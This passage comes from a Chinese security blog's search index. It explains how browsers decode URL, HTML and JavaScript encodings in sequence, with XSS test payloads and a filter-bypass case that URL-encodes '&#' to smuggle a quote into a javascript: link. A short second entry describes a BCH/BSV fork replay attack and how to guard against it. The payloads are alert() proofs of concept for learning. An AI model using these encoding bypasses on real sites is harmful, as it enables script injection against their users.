</code></pre>解析过程是迭代的，解析器从词法分析器处取到一个新的符号，并试着用这个符号匹配一条语法规则，如果匹配了一条规则，这个符号对应的节点将被添加到解析树上，然后解析器请求另一个符号。如果没有匹配到规则，解析器将在内部保存该符号，并从词法分析器取下一个符号，直到所有内部保存的符号能够匹配一项语法规则。如果最终没有找到匹配的规则，解析器将抛出一个异常，这意味着文档无效或是包含语法错误。</li>
</ul>
<pre><code>如：&lt;img11 src=1 onerror=&#39;a(1)&#39;&gt;
在浏览器解析时会报错：
HTML 文档的字符编码未声明。如果该文件包含 US-ASCII 范围之外的字符，该文件将在某些浏览器配置中呈现为乱码。页面的字符编码必须在文档或传输协议层声明。  untitled.html
</code></pre><p>而最后输出的树，也就是这里的解析树，是由DOM元素及属性节点组成的<br>DOM树构建完毕后</p>
<p>html编码就会被解析，html解析中无法用常规的自下而上或自上而下的解析器进行解析<br>原因在于：<br>    语言的宽容本质<br>    浏览器历来对一些常见的无效html用法采取包容态度<br>    解析过程需要不断地重复，源内容在解析过程中通常不会改变，但是在 HTML 中，脚本标记如果包含 document.write，就会添加额外的标记，这样解析过程实际上就更改了输入内容，浏览器创建了自定义的解释器来解析HTML</p>
<ul>
<li>html解释器算法</li>
</ul>
<p>标记化和树构建<br>标记化是词法分析过程、将输入内容解析成多个标记<br>构建解析流程图如下：</p>
<pre><code>graph TD
st[network]--&gt;a1
a1[tokeniser]--&gt;a2
a2{tree construction}--&gt;a3[DOM]
a2{tree construction}--&gt;a4[ScriptExecution]
a4[ScriptExecution]--&gt;a1
a3--&gt;a4
</code></pre><p>标记生成器识别标记，传递给树构造器，然后接受下一个字符以识别下一个标记；如此反复直到输入的结束</p>
<h5 id="js解释器"><a href="#js解释器" class="headerlink" title="js解释器"></a>js解释器</h5><p>在处理如<br>“script、style”这样的标签，解释器会切换到特殊解析模式，在src href 后边加入的JavaScript 等的html解码后，进入js的解析模式，进入该模式后，该DOM节点已经建立起了。</p>
<p>所以先进行jsunincode编码再进行html编码可以正常触发</p>
<pre><code>&lt;a href=&quot;javascript:alert&amp;#40;&amp;#39;&amp;#60;&amp;#92;&amp;#117;&amp;#52;&amp;#101;&amp;#48;&amp;#48;&amp;#62;&amp;#39;&amp;#41;&quot;&gt;test&lt;/a&gt;
</code></pre><p>在测试中 先进行html实体编码，再进行js16进制转码，不会正常解码</p>
<pre><code>源码:&lt;a href=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;test&lt;/a&gt;
</code></pre><p>测试输出为unicode编码：</p>
<pre><code>先html:
&lt;a href=&quot;javascript:alert(&#39;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&#39;)&quot;&gt;test&lt;/a&gt;
再js16进制：
&lt;a href=&quot;javascript:alert(&#39;\x26\x23\x31\x31\x36\x3b\x26\x23\x31\x30\x31\x3b\x26\x23\x31\x31\x35\x3b\x26\x23\x31\x31\x36;&#39;)&quot;&gt;test&lt;/a&gt;

</code></pre><p>正常输出：test</p>
<pre><code>&lt;a href=&quot;javascript:alert(&#39;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&amp;#92;&amp;#120;&amp;#54;&amp;#53;&amp;#92;&amp;#120;&amp;#55;&amp;#51;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&#39;)&quot;&gt;test&lt;/a&gt;
</code></pre><pre><code>先js 16进制:
&lt;a href=&quot;javascript:alert(&#39;\x74\x65\x73\x74&#39;)&quot;&gt;test&lt;/a&gt;
再html编码：
&lt;a href=&quot;javascript:alert(&#39;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&amp;#92;&amp;#120;&amp;#54;&amp;#53;&amp;#92;&amp;#120;&amp;#55;&amp;#51;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&#39;)&quot;&gt;test&lt;/a&gt;
</code></pre><p>先进行html编码再进行unicode编码 解析失败</p>
<pre><code>&lt;a href=&quot;javascript:\u0026\u0023\u0039\u0037\u003b\u0026\u0023\u0031\u0030\u0038\u003b\u0026\u0023\u0031\u0030\u0031\u003b\u0026\u0023\u0031\u0031\u0034\u003b\u0026\u0023\u0031\u0031\u0036\u003b(&#39;1111&#39;)&quot;&gt;test&lt;/a&gt;
</code></pre><p>先进行unicode编码再进行html编码解析成功</p>
<pre><code>&lt;a href=&quot;javascript:&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;(&#39;1111&#39;)&quot;&gt;test&lt;/a&gt;
</code></pre><p>综上 浏览器对于编码解码的顺序 url解码-html解码-js解码</p>
<p>tips:经测试 js16进制/8进制只会在js 字符串中解析，如果作为变量名、触发事件则不会解析如：</p>
<p>思考：&lt;&lt;白帽子讲Web安全&gt;&gt;</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;
    var x2=\x61\x6c\x65rt(1);
    var x1=&quot; &#39;onclick=alert(1);//&#39;&quot;
    var x=&quot;\x20\x27onclick\x3dalert\x281\x29\x3b\x2f\x2f\27&quot;;
    document.write(&quot;&lt;a href=&#39;&quot;+x1+&quot;&#39;&gt;test&lt;a&gt;&quot;);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre><p>可以用以下例子来尝试看一下弹窗顺序</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;img src=1 onerror=&#39;a(1)&#39;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
    a(2);
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
    function a(c){
        alert(c);
    }
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
    a(3);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>参考 0x_Jin 凯神的<a href="http://su.xmd5.org/static/drops/tips-689.html" target="_blank" rel="noopener">《XSS与字符编码那些事儿》</a></p>
<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><h5 id="xss中禁用了-amp-符号"><a href="#xss中禁用了-amp-符号" class="headerlink" title="xss中禁用了&amp;#符号"></a>xss中禁用了&amp;#符号</h5><p>实体编码是由&amp;#组成的，这个时候只能考虑能不能通过url编码绕过&amp;#，再让浏览器解码成 &amp;# 然后拼接x27 最后就成为了单引号的html16进制编码来绕过<br>借用凯神的案例 </p>
<pre><code>&lt;a href=&quot;javascript:location=&#39;./3.3.php?offset=&#39;+document.getElementById(&#39;pagenum&#39;).value+&#39;&amp;searchtype_yjbg=yjjg&amp;searchvalue_yjbg=&#39;&quot;&gt;GO&lt;/a&gt;
</code></pre><p>提交的payload：</p>
<pre><code>wooyun%26%23x27,alert(1)%2b%26%23x27
</code></pre><p>解码后</p>
<pre><code>&#39;,alert(1)&#39;
</code></pre><p>感谢在@星尘的指导下，从新捋了捋xss编码的问题，现阶段就暂时到这吧。还是沉淀不够。革命尚未成功，同志尚需努力啊 by @流云</p>
<h4 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h4><p>在线编码解码工具：<br><a href="https://www.mokuge.com/tool/unicode/" target="_blank" rel="noopener">https://www.mokuge.com/tool/unicode/</a></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><a href="https://www.cesafe.com/5075.html" target="_blank" rel="noopener">https://www.cesafe.com/5075.html</a></li>
<li><a href="http://su.xmd5.org/static/drops/tips-689.html" target="_blank" rel="noopener">http://su.xmd5.org/static/drops/tips-689.html</a></li>
</ul>
<p>宽字节：</p>
<ul>
<li><a href="http://book.2cto.com/201301/14515.html" target="_blank" rel="noopener">http://book.2cto.com/201301/14515.html</a> </li>
<li><a href="http://itindex.net/detail/47408-xss-%E5%AD%A6%E4%B9%A0-xss" target="_blank" rel="noopener">http://itindex.net/detail/47408-xss-%E5%AD%A6%E4%B9%A0-xss</a> </li>
<li><a href="http://www.wooyun.org/bugs/wooyun-2010-015969" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-015969</a></li>
<li><a href="https://blog.csdn.net/u013648937/article/details/46629827" target="_blank" rel="noopener">https://blog.csdn.net/u013648937/article/details/46629827</a> </li>
</ul>
]]></content>
      
        <categories>
            
            <category> Web渗透 </category>
            
            <category> 常规渗透 </category>
            
            <category> XSS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> XSS </tag>
            
            <tag> Web渗透 </tag>
            
            <tag> 常规渗透 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[BCH分叉-重放攻击解决方案]]></title>
      <url>/2018/07/23/BCH%E5%88%86%E5%8F%89/</url>
      <content type="html"><![CDATA[<h3 id="BCH分叉-重放攻击解决方案"><a href="#BCH分叉-重放攻击解决方案" class="headerlink" title="BCH分叉 重放攻击解决方案"></a>BCH分叉 重放攻击解决方案</h3><p>BCH在进行硬分叉：分为BCH和BCHSV</p>
<p>对于分叉前拥有BCH的用户，在分叉后该钱包中会拥有BCH/BSV两种虚拟货币，若是分叉前钱包里有BCH，在硬分叉完成后，这个钱包里也会生成相应的BSV</p>
<h5 id="目的：分离同一地址中-共同存在的BCH和BSV-来防重放攻击"><a href="#目的：分离同一地址中-共同存在的BCH和BSV-来防重放攻击" class="headerlink" title="目的：分离同一地址中 共同存在的BCH和BSV 来防重放攻击"></a>目的：分离同一地址中 共同存在的BCH和BSV 来防重放攻击</h5><h5 id="针对转账业务"><a href="#针对转账业务" class="headerlink" title="针对转账业务"></a>针对转账业务</h5><p>限制条件：该用户账户拥有BCH的同时也拥有BSV<br>利用原理：在用户原意在分叉后转帐 BCH 时，该消息被攻击者广播在BSV链上，导致用户的BSV资产也被转移，受到重放攻击。</p>
<h5 id="INPUT污染法分离："><a href="#INPUT污染法分离：" class="headerlink" title="INPUT污染法分离："></a>INPUT污染法分离：</h5><p>INPUT污染法的原理：<br>就是用分叉后的BCH混入分叉前的BCH，从而达到分离BCH与BSV的目的。<br>具体操作如下：<br>　　    在分叉完成后，用分叉后的BCH币充值到分叉前的BCH币所在的钱包，然后将这个钱包里所有的BCH币（分叉前的BCH和分叉后的BCH）转移到另<br>一个地址。此次交易在BCH链可以成功完成，但是在BSV链上广播时却不能被节点接受，因为这笔交易离存在着分叉后的BCH币。这样子，BSV还是存<br>在于原本的钱包中，达到了将BCH和BSV分离的目的。</p>
<h4 id="构造特有的操作码交易："><a href="#构造特有的操作码交易：" class="headerlink" title="构造特有的操作码交易："></a>构造特有的操作码交易：</h4><p>分叉后的BCH和BSV链的共识机制有一定的区别，主要体现在操作码上，</p>
<p>BCH链上交易时，构造含有 OP_CHECKDATASIG 操作码的输出</p>
<p>BCHSV链上交易时，构造含有 OP_MUL 操作码的输出</p>
]]></content>
      
        <categories>
            
            <category> 区块链安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 区块链安全 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
